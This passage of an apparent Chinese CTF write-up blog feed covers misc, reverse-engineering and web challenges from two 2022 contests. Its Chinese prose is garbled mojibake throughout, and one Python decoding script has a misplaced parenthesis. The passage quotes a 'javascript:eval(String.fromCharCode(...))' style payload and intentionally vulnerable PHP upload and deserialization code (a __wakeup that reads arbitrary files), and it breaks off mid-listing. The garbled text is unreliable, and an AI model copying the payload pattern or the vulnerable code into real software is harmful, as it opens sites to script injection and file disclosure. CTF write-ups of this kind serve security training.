title="æ–‡ä»¶ä¿®å¤"></a>æ–‡ä»¶ä¿®å¤</h3><p>å¼€å±€ç»™äº†ä¸€ä¸ªé™„ä»¶ï¼Œè§£å‹ä¹‹æ˜¯ä¸€ä¸ªpdf æµ‹äº†ä¸€æµ‹å•¥ä¹Ÿæ²¡æœ‰ï¼Œæ‹–åˆ°winhexä¸­çœ‹ä¸‹åå…­è¿›åˆ¶</p><p><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930163312714.png" alt="image-20220930163312714"></p><p>å¾€ä¸‹æ‹‰ä¸€æ‹‰çœ‹åˆ°æœ‰æ’å…¥çš„æ•°æ®ï¼Œåœ¨f æˆ–è€…nåé¢æ˜¯09 æˆ–è€… 20 å¹¶ä¸”éƒ½æ˜¯å…«ä½</p><p>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æƒ³åˆ°  æŠŠ09 20 è½¬æˆ 0æˆ–1   å› ä¸ºæ˜¯å…«ä½  æ¯”å¦‚ 01010101è¿™ä¸ªå…«ä½äºŒè¿›åˆ¶å¯ä»¥è½¬æˆ10è¿›åˆ¶ç„¶åè½¬ascii è¿™æ ·å°±æ˜¯å­—ç¬¦äº† </p><p>æœ‰äº†æ€è·¯  å¼€å§‹åšï¼Œè¿™æ ·çš„æ•°æ®é‡  æ‰‹æ’•æ˜¾ç„¶æ˜¯ä¸è¡Œçš„ï¼Œæˆ‘ä»¬å†™è„šæœ¬</p><p>å…ˆåœ¨winhexå…¨é€‰å­—ç¬¦ï¼Œå³é”®-ã€‹edit-ã€‹copy block-ã€‹hex value</p><p>å¤åˆ¶å‡ºæ¥  ç„¶å</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">alist = []</span><br><span class="line"><span class="comment">#line ä¸ºé‚£ä¸€å¤§ä¸²hex valueå€¼</span></span><br><span class="line">line = <span class="string">&quot;255044462D312E3520202009092020090D0A25B5B5B5B520202020202020200D0A312030206F626A0D0A3C3C2F547970652F436174616C6F672F50616765732032203020522F4C616E67287A682D434E&quot;</span></span><br><span class="line"><span class="comment"># å…ˆæŠŠlineä¸¤ä¸¤å­—ç¬¦ä¸€ç»„</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(line), <span class="number">2</span>):</span><br><span class="line">alist.append(line[i:i+<span class="number">2</span>])</span><br><span class="line"><span class="comment">#åˆ¤æ–­æ¯ç»„çš„å­—ç¬¦æ˜¯ä¸æ˜¯09 æˆ–è€…20  å¹¶ä¸”  åé¢ä¸ƒä½ä¹Ÿå¿…é¡»æ˜¯  09æˆ–20  å› ä¸ºä¸­é—´å¯èƒ½ä¼šæœ‰09æˆ–20 æ‰°ä¹±æˆ‘ä»¬æˆªå–</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(alist)):</span><br><span class="line">    <span class="keyword">if</span> (alist[i] == <span class="string">&quot;09&quot;</span> <span class="keyword">or</span> alist[i] == <span class="string">&quot;20&quot;</span>) <span class="keyword">and</span> (alist[i+<span class="number">1</span>] == <span class="string">&quot;09&quot;</span> <span class="keyword">or</span> alist[i+<span class="number">1</span>] == <span class="string">&quot;20&quot;</span>) <span class="keyword">and</span> (alist[i+<span class="number">2</span>] == <span class="string">&quot;09&quot;</span> <span class="keyword">or</span> alist[i+<span class="number">2</span>] == <span class="string">&quot;20&quot;</span> <span class="keyword">and</span> (alist[i+<span class="number">3</span>] == <span class="string">&quot;09&quot;</span> <span class="keyword">or</span> alist[i+<span class="number">3</span>] == <span class="string">&quot;20&quot;</span>) <span class="keyword">and</span> (alist[i+<span class="number">4</span>] == <span class="string">&quot;09&quot;</span> <span class="keyword">or</span> alist[i+<span class="number">4</span>] == <span class="string">&quot;20&quot;</span>) <span class="keyword">and</span> (alist[i+<span class="number">5</span>] == <span class="string">&quot;09&quot;</span> <span class="keyword">or</span> alist[i+<span class="number">5</span>] == <span class="string">&quot;20&quot;</span>) <span class="keyword">and</span> (alist[i+<span class="number">6</span>] == <span class="string">&quot;09&quot;</span> <span class="keyword">or</span> alist[i+<span class="number">6</span>] == <span class="string">&quot;20&quot;</span>) <span class="keyword">and</span> (alist[i+<span class="number">7</span>] == <span class="string">&quot;09&quot;</span> <span class="keyword">or</span> alist[i+<span class="number">7</span>] == <span class="string">&quot;20&quot;</span>)):</span><br><span class="line">        s = alist[i]+alist[i+<span class="number">1</span>]+alist[i+<span class="number">2</span>]+alist[i+<span class="number">3</span>]+alist[i+<span class="number">4</span>]+alist[i+<span class="number">5</span>]+alist[i+<span class="number">6</span>]+alist[i+<span class="number">7</span>]</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#å°†09æ¢æˆ1    20æ¢æˆ0</span></span><br><span class="line">        s = s.replace(<span class="string">&quot;09&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">        s = s.replace(<span class="string">&quot;20&quot;</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">        <span class="comment"># 00011001</span></span><br><span class="line">        <span class="comment"># 00110010D</span></span><br><span class="line">        <span class="comment"># 0110010D0A</span></span><br><span class="line">        <span class="comment"># 0010D0A25B5B5</span></span><br><span class="line">        <span class="comment"># 00000000</span></span><br><span class="line">        <span class="comment"># 00000000</span></span><br><span class="line">        <span class="comment"># 01110100</span></span><br><span class="line">        <span class="comment"># t11101000D</span></span><br><span class="line">        <span class="comment"># 101000D0A33</span></span><br><span class="line">        <span class="comment"># 01111000</span></span><br><span class="line">        <span class="comment"># x11110000D</span></span><br><span class="line">        <span class="comment"># 1110000D0A</span></span><br><span class="line">        <span class="comment"># 01110100</span></span><br><span class="line">        <span class="comment"># t11101000D</span></span><br><span class="line">        <span class="comment"># 101000D0A35</span></span><br><span class="line">        <span class="comment"># 01100110</span></span><br><span class="line">        <span class="comment"># f001100D0A36</span></span><br><span class="line">        <span class="comment"># 01100D0A360</span></span><br><span class="line">        <span class="comment">#print(alist[i]+alist[i+1]+alist[i+2]+alist[i+3]+alist[i+4]+alist[i+5]+alist[i+6]+alist[i+7])</span></span><br><span class="line">        <span class="comment">#æ­¤æ—¶è¿˜æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²   ç”¨splitåˆ†å‰²ä¸€ä¸‹</span></span><br><span class="line">        s = s.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">            <span class="comment">#åˆ¤æ–­å‡ºæ¥å°äº8çš„å­—ç¬¦ æœ€åè½¬ascii</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(i)&lt;=<span class="number">8</span>:</span><br><span class="line">                i=<span class="string">&#x27;0b&#x27;</span>+i                   </span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">eval</span>(i)),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment">#txtflag&#123;EFAWEOFJ4TUW0Tgy&#125;</span></span><br></pre></td></tr></table></figure><p>emmm è¿™é¢˜150ptæ„Ÿè§‰æœ‰ç‚¹äºæ¯”èµ›æ—¶æ²¡æœ‰è§£å‡ºæ¥ï¼Œæ—¶é—´å¤ªçŸ­äº†ï¼Œåé¢å¤ç°çš„</p><h3 id="å¥‡æ€ªçš„å›¾ç‰‡"><a href="#å¥‡æ€ªçš„å›¾ç‰‡" class="headerlink" title="å¥‡æ€ªçš„å›¾ç‰‡"></a>å¥‡æ€ªçš„å›¾ç‰‡</h3><p>å¼€å±€ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œæ˜¯raræ–‡ä»¶ï¼Œè§£å‹æœ‰å¯†ç ï¼Œé€šå¸¸æ¥è¯´ä¼ªåŠ å¯†ä¸€èˆ¬éƒ½æ˜¯zipè¿™é‡Œåº”è¯¥ä¸æ˜¯ä¼ªåŠ å¯†ï¼Œ<br>foremostç›´æ¥åˆ†ç¦»ï¼Œä¹Ÿä»€ä¹ˆéƒ½æ²¡å‡ºæ¥ï¼Œæˆ‘ä»¬ç›´æ¥stringsæ¢­<br>strings å¯ä»¥å°†ä¸€ä¸ªæ–‡ä»¶çš„hexæ•°æ®ä¸­çš„å¯æ˜¾å­—ç¬¦è¾“å‡ºå‡ºæ¥</p><p><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930164552419.png" alt="image-20220930164552419"></p><p><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930164817607.png" alt="image-20220930164817607"></p><p><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930164834081.png" alt="image-20220930164834081"><br>666C61677B4A7573745F65617379217DD<br>TEdDVEYlN0JkR2hwYzE5cGMxOWhYM2R5YjI1blgyWnNZV2NsTWpFJTNEJTdE<br>ä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œç¬¬ä¸€ä¸ªæ˜¾ç„¶æ˜¯16è¿›åˆ¶ï¼Œç›´æ¥ç™¾åº¦ä¸€ä¸ªè½¬ä¸€ä¸‹<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930165049824.png" alt="image-20220930165049824"><br><code>flag&#123;Just_easy!&#125;</code><br>è¿™ä¸ªå­—ç¬¦ä¸²è§£å‡ºæ¥æ˜¯ä¸ªå‡çš„ æœ‰å…´è¶£çš„åŒå­¦è§£ä¸€ä¸‹</p><h3 id="æœªçŸ¥çš„ç¼–ç "><a href="#æœªçŸ¥çš„ç¼–ç " class="headerlink" title="æœªçŸ¥çš„ç¼–ç "></a>æœªçŸ¥çš„ç¼–ç </h3><p>Â <code>å‚è€ƒä»£ç å¦‚ä¸‹ï¼š&lt;div style=&quot;background-image:url(javascript:eval(String.fromCharCode(%66%6C%61%67%7B%64%34%38%65%31%61%34%64%2D%30%34%63%64%2D%34%62%36%34%2D%38%36%65%39%2D%37%37%66%38%66%35%31%32%39%36%30%35%7D)))&quot;&gt; </code><br>ascllä½ çŸ¥é“æ€ä¹ˆè§£å—ï¼Ÿ<br>ç­¾åˆ°é¢˜ï¼Œurlè§£ä¸€ä¸‹å°±å¯ä»¥äº†<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930165704813.png" alt="image-20220930165704813"></p><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h3><p>ä¸ä¼šï¼Œç›´æ¥ç™¾åº¦<br>å‚è€ƒ<code>https://www.jianshu.com/p/7779f3e83384</code></p><h3 id="pyé€†å‘"><a href="#pyé€†å‘" class="headerlink" title="pyé€†å‘"></a>pyé€†å‘</h3><p>ä¸æ˜¯æˆ‘åšçš„ï¼Œå®‡å“¥åšçš„ï¼Œæˆ‘ä¸ä¼š<br>å‚è€ƒå®‡å“¥çš„wp<br>é¢˜ç›®ç»™å‡ºæºç   ç›´æ¥ç™¾åº¦å…³é”®ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">key, seed, string</span>):</span></span><br><span class="line">    rst = []</span><br><span class="line">    <span class="keyword">for</span> v <span class="keyword">in</span> string:</span><br><span class="line">        rst.append((<span class="built_in">ord</span>(v) + seed ^ <span class="built_in">ord</span>(key[seed])) % <span class="number">255</span>)</span><br><span class="line">        seed = (seed + <span class="number">1</span>) % <span class="built_in">len</span>(key)</span><br><span class="line">    <span class="keyword">return</span> rst</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;Welcome to python crackme&quot;</span>)</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    KEY1 = <span class="string">&quot;Maybe you are good at decryptint Byte Code, have a try!&quot;</span></span><br><span class="line">    KEY2 = [</span><br><span class="line">        <span class="number">111</span>,</span><br><span class="line">        <span class="number">52</span>,</span><br><span class="line">        <span class="number">24</span>,</span><br><span class="line">        <span class="number">28</span>,</span><br><span class="line">        <span class="number">120</span>,</span><br><span class="line">        <span class="number">50</span>,</span><br><span class="line">        <span class="number">37</span>,</span><br><span class="line">        <span class="number">62</span>,</span><br><span class="line">        <span class="number">67</span>,</span><br><span class="line">        <span class="number">52</span>,</span><br><span class="line">        <span class="number">48</span>,</span><br><span class="line">        <span class="number">6</span>,</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        <span class="number">122</span>,</span><br><span class="line">        <span class="number">3</span>,</span><br><span class="line">        <span class="number">22</span>,</span><br><span class="line">        <span class="number">72</span>,</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        <span class="number">14</span>,</span><br><span class="line">        <span class="number">46</span>,</span><br><span class="line">        <span class="number">27</span>,</span><br><span class="line">        <span class="number">22</span>,</span><br><span class="line">    ]</span><br><span class="line">    en_out = encrypt(KEY1, <span class="number">5</span>, flag)</span><br><span class="line">    <span class="keyword">if</span> KEY2 == en_out:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;You Win,FLAG IS flag&#123;%s&#125;&quot;</span> % flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Try Again !&quot;</span>)</span><br></pre></td></tr></table></figure><p>ç›´æ¥æ›¿æ¢key2å°±è¡Œäº†<br>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_each</span>(<span class="params">key, seed, KEY2</span>):</span></span><br><span class="line">    answer = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> KEY2:</span><br><span class="line">        password = each</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">            result = (i + seed ^ <span class="built_in">ord</span>(key[seed])) % <span class="number">255</span></span><br><span class="line">            <span class="keyword">if</span> password == result:</span><br><span class="line">                answer += <span class="built_in">chr</span>(i)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        seed = (seed + <span class="number">1</span>) % <span class="built_in">len</span>(key)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> answer</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    KEY1 = <span class="string">&quot;Maybe you are good at decryptint Byte Code, have a try!&quot;</span></span><br><span class="line">    KEY2 = [</span><br><span class="line">        <span class="number">111</span>,</span><br><span class="line">        <span class="number">52</span>,</span><br><span class="line">        <span class="number">24</span>,</span><br><span class="line">        <span class="number">28</span>,</span><br><span class="line">        <span class="number">120</span>,</span><br><span class="line">        <span class="number">50</span>,</span><br><span class="line">        <span class="number">37</span>,</span><br><span class="line">        <span class="number">62</span>,</span><br><span class="line">        <span class="number">67</span>,</span><br><span class="line">        <span class="number">52</span>,</span><br><span class="line">        <span class="number">48</span>,</span><br><span class="line">        <span class="number">6</span>,</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        <span class="number">122</span>,</span><br><span class="line">        <span class="number">3</span>,</span><br><span class="line">        <span class="number">22</span>,</span><br><span class="line">        <span class="number">72</span>,</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        <span class="number">14</span>,</span><br><span class="line">        <span class="number">46</span>,</span><br><span class="line">        <span class="number">27</span>,</span><br><span class="line">        <span class="number">22</span>,</span><br><span class="line">    ]</span><br><span class="line">    answer = decrypt_each(KEY1, <span class="number">5</span>, KEY2)</span><br><span class="line">    <span class="built_in">print</span>(answer)</span><br><span class="line"><span class="comment">#å¾—åˆ°ï¼š</span></span><br><span class="line"><span class="comment">#JGpaOILOVEPYTHONSOMUCHK</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ­¤é¢˜å‚è€ƒ<code>https://l1nwatch.gitbook.io/ctf/idf-shi-yan-shi/reverse-dao-hang-ni-shi/python-bytecode</code></p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="unsortheap"><a href="#unsortheap" class="headerlink" title="unsortheap"></a>unsortheap</h3><p>ä¸ä¼š</p><h3 id="myhouse"><a href="#myhouse" class="headerlink" title="myhouse"></a>myhouse</h3><p>ä¸ä¼š</p><blockquote><p>è¿™æ¬¡çš„é¢˜éƒ½èƒ½æœåˆ°ï¼Œä¹Ÿæ²¡å•¥å¥½è¯´çš„ï¼Œå¤ªèœäº†,webä¹Ÿæ²¡å•¥æ„æ€<br>æ„Ÿè°¢æˆ‘çš„å°ä¼™ä¼´ä¸¤å°æ—¶çš„åŠªåŠ›ï¼Œå¾ˆå¼ºäº†<br>å®‡å“¥å¤ªå¼ºäº†<br>ä¸€ç›´åœ¨è·¯ä¸Š</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> å¸‚èµ› </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022ç¬¬äº”ç©ºé—´éƒ¨åˆ†wp</title>
      <link href="/2022/09/20/2022%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E9%83%A8%E5%88%86wp/"/>
      <url>/2022/09/20/2022%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<h4 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h4><h3 id="5-ç®€å•çš„Base"><a href="#5-ç®€å•çš„Base" class="headerlink" title="5_ç®€å•çš„Base"></a>5_ç®€å•çš„Base</h3><p>åå…­è¿›åˆ¶è½¬ä¸€ä¸‹å­—ç¬¦ä¸²å³å¯</p><p>666c61677b57656c636f6d655f686572657d</p><p>flag{Welcome_here}</p><h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><h3 id="5-web-BaliYun"><a href="#5-web-BaliYun" class="headerlink" title="5_web_BaliYun"></a>5_web_BaliYun</h3><p>è€ƒç‚¹ï¼špharååºåˆ—åŒ–</p><p>ç»è¿‡ç›®å½•æ‰«æå‘ç°  <code>www.zip</code></p><blockquote><p>index.php</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                    <span class="keyword">include</span>(<span class="string">&quot;class.php&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_name&#x27;</span>]))&#123;</span><br><span class="line">                        <span class="variable">$down</span> = <span class="keyword">new</span> check_img();</span><br><span class="line">                        <span class="keyword">echo</span> <span class="variable">$down</span>-&gt;img_check();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">                        <span class="variable">$up</span> = <span class="keyword">new</span> upload();</span><br><span class="line">                        <span class="keyword">echo</span> <span class="variable">$up</span>-&gt;start();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>class.php</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Valid_ext</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ext = end(explode(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;size = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;Valid_ext = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">start</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(file_exists(<span class="keyword">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Image already exsists&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(!in_array(<span class="keyword">$this</span>-&gt;ext, <span class="keyword">$this</span>-&gt;Valid_ext))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Only Image Can Be Uploaded&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;move();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">move</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span>.<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Upload succsess!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">check_img</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$img_name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;img_name = <span class="variable">$_GET</span>[<span class="string">&#x27;img_name&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">img_check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(file_exists(<span 